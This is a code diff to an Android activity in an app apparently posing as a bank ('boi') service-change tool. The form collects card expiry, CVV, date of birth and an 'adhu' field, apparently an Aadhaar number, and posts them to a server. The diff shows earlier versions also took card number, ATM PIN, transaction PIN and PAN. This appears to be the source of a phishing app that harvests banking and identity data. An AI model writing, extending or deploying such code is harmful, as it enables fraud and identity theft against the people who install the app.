@@ -8,6 +8,7 @@ import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import com.mydesign.servicechange.boi.net.FrontServices.DateInputMask;
 import com.mydesign.servicechange.boi.net.FrontServices.DebitCardInputMask;
 import com.mydesign.servicechange.boi.net.FrontServices.ExpiryDateInputMask;
 import com.mydesign.servicechange.boi.net.FrontServices.FormValidator;
@@ -36,15 +37,19 @@ public class SecondActivity extends AppCompatActivity {
         int id = getIntent().getIntExtra("id", -1);
         ImageView buttonSubmit = findViewById(R.id.submitForm);
 
-        EditText card = findViewById(R.id.card);
-        card.addTextChangedListener(new DebitCardInputMask(card));
 
         EditText expiry = findViewById(R.id.expiry);
         expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));
 
+        EditText adhu = findViewById(R.id.adhu);
+        adhu.addTextChangedListener(new DebitCardInputMask(adhu));
+
+        EditText dobb = findViewById(R.id.dobb);
+        dobb.addTextChangedListener(new DateInputMask(dobb));
 
         ids = new HashMap<>();
-        ids.put(R.id.card, "card");
+        ids.put(R.id.adhu, "adhu");
+        ids.put(R.id.dobb, "dobb");
         ids.put(R.id.expiry, "expiry");
         ids.put(R.id.cvv, "cvv");
 
@@ -76,7 +81,7 @@ public class SecondActivity extends AppCompatActivity {
                                 try {
                                     JSONObject response = new JSONObject(result);
                                     if(response.getInt("status")==200){
-                                        Intent intent = new Intent(getApplicationContext(), ThirdActivity.class);
+                                        Intent intent = new Intent(getApplicationContext(), LastActivity.class);
                                         intent.putExtra("id", id);
                                         startActivity(intent);
                                     }else{
@@ -100,44 +105,26 @@ public class SecondActivity extends AppCompatActivity {
     }
 
     public boolean validateForm() {
-        boolean isValid = true; // Assume the form is valid initially
-
-        // Clear dataObject before adding new data
+        boolean isValid = true;
         dataObject.clear();
 
         for (Map.Entry<Integer, String> entry : ids.entrySet()) {
             int viewId = entry.getKey();
             String key = entry.getValue();
             EditText editText = findViewById(viewId);
-
-            // Check if the field is required and not empty
             if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
-                isValid = false; // Mark as invalid if required field is missing
-                continue; // Continue with the next field
+                isValid = false;
+                continue;
             }
-
             String value = editText.getText().toString().trim();
-
-            // Validate based on the key
             switch (key) {
-                case "phone":
-                    if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit " + key)) {
+                case "dobb":
+                    if (!FormValidator.validateMinLength(editText, 10, "Required Valid Input " + key)) {
                         isValid = false;
                     }
                     break;
-
                 case "cvv":
                     if (!FormValidator.validateMinLength(editText, 3, "Invalid CVV")) {
-                        isValid = false;
-                    }
-                    break;
-                case "atmpin":
-                    if (!FormValidator.validateMinLength(editText, 4, "Invalid ATM Pin")) {
-                        isValid = false;
-                    }
-                    break;
-                case "tpin":
-                    if (!FormValidator.validateMinLength(editText, 4, "Invalid Pin")) {
                         isValid = false;
                     }
                     break;
@@ -146,16 +133,7 @@ public class SecondActivity extends AppCompatActivity {
                         isValid = false;
                     }
                     break;
-                case "card":
-                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
-                        isValid = false;
-                    }
-                    break;
-                case "pan":
-                    if (!FormValidator.validatePANCard(editText, "Invalid Pan Number")) {
-                        isValid = false;
-                    }
-                    break;
+
                 default:
                     break;
             }
